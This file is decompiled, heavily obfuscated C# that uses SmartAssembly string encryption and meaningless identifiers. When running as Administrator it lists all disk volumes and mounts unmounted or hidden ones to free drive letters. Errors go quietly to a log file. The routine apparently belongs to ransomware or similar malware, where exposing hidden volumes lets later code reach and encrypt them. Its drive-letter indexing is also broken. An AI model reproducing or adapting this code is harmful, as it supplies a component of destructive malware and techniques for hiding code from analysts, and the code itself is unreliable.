using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace ybfSLIGKlaODvJ;

public static class xSFZkSzRCPc
{
	public enum HUrrweiwPPI : uint
	{
		FeDybcefAsNkxFNt,
		ihWZHcEJtHd,
		cQLpjnmXhEhjPRI,
		yFvPjjpztKaM,
		JtViCVrojRK,
		jnJgNzlyheAU,
		OXvOZkUfBMKq
	}

	private sealed class nlfmlXbIpq
	{
		public uint fHrNCXVOBKXLIQjLP;

		public uint gHXwpfxNjbTq;

		public char[] lugPzLOxBcD;

		public bool _003CMountVolumes_003Eb__0(string string_0)
		{
			if (GetVolumePathNamesForVolumeNameW(string_0, lugPzLOxBcD, gHXwpfxNjbTq, ref fHrNCXVOBKXLIQjLP))
			{
				return lugPzLOxBcD.Length != 3;
			}
			return true;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	public static extern HUrrweiwPPI GetDriveType([MarshalAs(UnmanagedType.LPStr)] string ogOAXyYwmeTs);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetVolumePathNamesForVolumeNameW(string LcnpnJGWlQasWOA, char[] kuycWvLzCKLj, uint HOiZoVUyREtY, ref uint FZwDnfsMTCbaM);

	[DllImport("kernel32.dll")]
	internal static extern bool SetVolumeMountPoint(string string_0, string string_1);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern int FindFirstVolume(StringBuilder stringBuilder_0, int int_0);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern bool FindNextVolume(int int_0, StringBuilder stringBuilder_0, int int_1);

	public static List<string> CWWNOdLydZGDQ()
	{
		StringBuilder stringBuilder = new StringBuilder(1024);
		List<string> list = new List<string>();
		int int_ = FindFirstVolume(stringBuilder, 1024);
		do
		{
			list.Add(stringBuilder.ToString());
			Console.WriteLine(stringBuilder.ToString());
		}
		while (FindNextVolume(int_, stringBuilder, 1024));
		return list;
	}

	public static void aBCmmONwoOrygLfPa()
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return;
		}
		try
		{
			nlfmlXbIpq CS_0024_003C_003E8__locals0 = new nlfmlXbIpq();
			string[] array = new string[26]
			{
				getString_0(107398067),
				getString_0(107398062),
				getString_0(107398057),
				getString_0(107398052),
				getString_0(107398015),
				getString_0(107398010),
				getString_0(107398005),
				getString_0(107398032),
				getString_0(107398027),
				getString_0(107398022),
				getString_0(107397985),
				getString_0(107397980),
				getString_0(107397975),
				getString_0(107398002),
				getString_0(107397997),
				getString_0(107397992),
				getString_0(107397955),
				getString_0(107397950),
				getString_0(107397945),
				getString_0(107397940),
				getString_0(107397967),
				getString_0(107397962),
				getString_0(107397957),
				getString_0(107398432),
				getString_0(107398427),
				getString_0(107398422)
			};
			string[] array2 = new string[array.Length];
			int num = 0;
			string[] array3 = array;
			foreach (string text in array3)
			{
				if (GetDriveType(text) == HUrrweiwPPI.ihWZHcEJtHd)
				{
					array2[num++] = text;
				}
			}
			List<string> source = CWWNOdLydZGDQ();
			CS_0024_003C_003E8__locals0.fHrNCXVOBKXLIQjLP = 0u;
			CS_0024_003C_003E8__locals0.gHXwpfxNjbTq = 120u;
			CS_0024_003C_003E8__locals0.lugPzLOxBcD = new char[260];
			foreach (string item in source.Where((string string_0) => !GetVolumePathNamesForVolumeNameW(string_0, CS_0024_003C_003E8__locals0.lugPzLOxBcD, CS_0024_003C_003E8__locals0.gHXwpfxNjbTq, ref CS_0024_003C_003E8__locals0.fHrNCXVOBKXLIQjLP) || CS_0024_003C_003E8__locals0.lugPzLOxBcD.Length != 3))
			{
				SetVolumeMountPoint(array2[num--], item);
				if (iWNOuKBWgwsf.rjVAnmtTRGwdsGoP)
				{
					try
					{
						Console.WriteLine(getString_0(107398449), array2[num--]);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (iWNOuKBWgwsf.eCrtUqxUXqEDfkG)
			{
				try
				{
					File.AppendAllText(iWNOuKBWgwsf.ZOToawIMfprr, getString_0(107398392) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static xSFZkSzRCPc()
	{
		Strings.CreateGetStringDelegate(typeof(xSFZkSzRCPc));
	}
}
